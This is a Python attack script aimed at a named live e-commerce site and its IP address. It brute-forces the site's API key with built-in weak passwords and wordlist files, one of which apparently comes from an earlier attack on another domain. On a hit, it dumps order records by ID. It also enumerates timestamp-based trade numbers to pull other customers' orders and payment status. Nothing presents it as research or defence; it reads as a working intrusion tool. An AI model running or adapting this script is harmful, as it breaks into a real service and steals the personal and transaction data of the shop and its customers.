#!/usr/bin/env python3
import subprocess, time, json, os, re
from pathlib import Path
from urllib.parse import quote

OUT=Path(os.environ["OUT"])
OUT.mkdir(parents=True, exist_ok=True)
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36"
IP="45.158.21.213"
BASE="https://xuxin66.top/shop"
CK=str(OUT/"c.jar")
LOG=OUT/"run.log"
BODY="/tmp/xux_body_out.txt"

def log(m):
    line=f"[{time.strftime('%H:%M:%S')}] {m}"
    print(line, flush=True)
    open(LOG,"a").write(line+"\n")

def curl(url, data=None, timeout=15):
    cmd=["curl","-sk","--max-time",str(timeout),"-A",UA,"-c",CK,"-b",CK,
         "--resolve",f"xuxin66.top:443:{IP}","-e",BASE+"/","-H","X-Requested-With: XMLHttpRequest"]
    if data is not None:
        cmd += ["-X","POST","--data",data]
    cmd += ["-w","\nHTTP%{http_code}","-o",BODY, url]
    body=""
    code="000"
    for attempt in range(3):
        r=subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+10)
        body=Path(BODY).read_text(errors="ignore") if Path(BODY).exists() else ""
        if "HTTP" in (r.stdout or ""):
            code=(r.stdout.strip().split("HTTP")[-1] or "000").strip()
        if code!="000" or body:
            return code, body
        time.sleep(1.2)
    return code, body

log(f"OUT={OUT}")
code,body=curl(BASE+"/")
log(f"HOME {code} len={len(body)}")

for path in [
    f"{BASE}/%61pi.php?act=tools&key=",
    f"{BASE}/%61pi.php?act=tools&key=wrongkey",
    f"{BASE}/%61pi.php?act=search&id=1",
    f"{BASE}/%61pi.php?act=search&id=1&key=wrongkey",
    f"{BASE}/%61pi.php?act=orders&key=wrongkey&limit=1",
    f"{BASE}/ajax.php?act=getcount",
    f"{BASE}/other/usdt-trc20/status.php?trade_no=20260803075904880",
    f"{BASE}/other/usdt/status.php?trade_no=20260803075904880",
]:
    code,body=curl(path)
    log(f"SANITY {path.split('/shop/')[-1]} => {code} {body[:180].replace(chr(10),' ')}")
    open(OUT/"sanity.txt","a").write(f"{path}\n{code}\n{body[:800]}\n\n")

keys=[]
keys += ["admin","123456","888888","666666","password","admin123","xuxin66","xuxin","xuxin666","xuxin888",
         "datou111","datou333","datou","ttwl66","1003","apikey","api","key","test","qq123","faka",
         "caihong","shop","store","vip","root","pass","abc123","qwerty","111111","000000",
         "123123","5201314","1314520","woaini","admin888","admin666","a123456","abc123456"]
for base in ["xuxin66","xuxin","datou","ttwl"]:
    for s in ["","123","888","666","2024","2025","2026","admin","api","key"]:
        keys.append(base+s)
for p in ["/data/wordlists/faka-tokens.txt","/data/tmp/xuxin66_d6f_syskeys.txt",
          "/data/automation/results/youhui1998.top/deep_20260801_015500/syskey_big.txt",
          "/data/tmp/xuxin66_syskeys_prio.txt"]:
    fp=Path(p)
    if not fp.exists():
        continue
    n=0
    for line in fp.open(errors="ignore"):
        w=line.strip()
        if w and len(w)<=64:
            keys.append(w); n+=1
        if n>=4000:
            break
seen=set(); uniq=[]
for k in keys:
    if k not in seen:
        seen.add(k); uniq.append(k)
keys=uniq
log(f"keys={len(keys)}")
open(OUT/"keys.txt","w").write("\n".join(keys))

hits=[]
for i,k in enumerate(keys,1):
    code,body=curl(f"{BASE}/%61pi.php?act=tools&key={quote(k, safe='')}&limit=1")
    if i%100==0 or i<=8:
        log(f"progress {i}/{len(keys)} body={body[:120]!r}")
    if not body:
        continue
    if any(x in body for x in ["API对接密钥错误","确保各项不能为空","请提供用户登录","No Act!","Connection"]):
        continue
    # hit-like
    log(f"KEYHIT key={k!r} code={code} body={body[:400]}")
    open(OUT/f"keyhit.txt","w").write(f"{k}\n{body}")
    hits.append({"key":k,"body":body[:2000]})
    code2,body2=curl(f"{BASE}/%61pi.php?act=search&id=10000&key={quote(k, safe='')}")
    log(f"search10000 => {body2[:400]}")
    open(OUT/"search_sample.json","w").write(body2)
    # dump a few ids
    for oid in [1,100,1000,5000,10000,11000,11200,11240]:
        c,b=curl(f"{BASE}/%61pi.php?act=search&id={oid}&key={quote(k, safe='')}")
        open(OUT/"search_dump.jsonl","a").write(json.dumps({"id":oid,"body":b},ensure_ascii=False)+"\n")
        log(f"id={oid} => {b[:200]}")
    break

open(OUT/"hits.json","w").write(json.dumps(hits,ensure_ascii=False,indent=2))
log(f"apikey_done hits={len(hits)}")

# status + card_check + trade samples regardless
for path in ["other/usdt-trc20/status.php","other/usdt/status.php"]:
    for tn in ["20260803075904880","20260802120000100","20260801180000500"]:
        code,body=curl(f"{BASE}/{path}?trade_no={tn}")
        if body.strip():
            log(f"STATUS {path} {tn} => {code} {body[:220]}")

code,body=curl(f"{BASE}/ajax.php?act=card_check", data="km=test123")
log(f"card_check => {code} {body[:220]}")

hits_tn=0
checked=0
for hh in range(10,22):
  for mm in (0,20,40):
    for ss in (0,30):
      for suf in (1,100,500,880):
        tn=f"20260801{hh:02d}{mm:02d}{ss:02d}{suf:03d}"
        checked+=1
        code,body=curl(f"{BASE}/ajax.php?act=query", data=f"qq={tn}&type=1")
        if body and re.search(r'"id"\s*:', body):
            log(f"TNHIT {tn} {body[:350]}")
            open(OUT/f"tn_{tn}.json","w").write(body)
            hits_tn+=1
        if checked%40==0:
            log(f"tn progress {checked} hits={hits_tn}")
log(f"DONE tn_checked={checked} tn_hits={hits_tn}")
